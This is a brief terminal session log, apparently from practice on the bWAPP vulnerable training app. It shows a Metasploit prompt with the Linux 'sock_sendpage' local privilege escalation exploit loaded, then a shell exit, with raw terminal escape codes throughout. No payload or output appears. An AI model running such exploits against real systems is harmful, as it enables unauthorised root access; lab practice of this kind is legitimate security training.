+[4mmsf5[0m exploit([1m[31mlinux/local/sock_sendpage[0m) [0m> [0m]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-sendpage[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-sendpage[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-sendpage[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-sendpage[00m] $ exit
+
+Script done on 2020-08-18 18:58:27+05:30 [COMMAND_EXIT_CODE="0"]
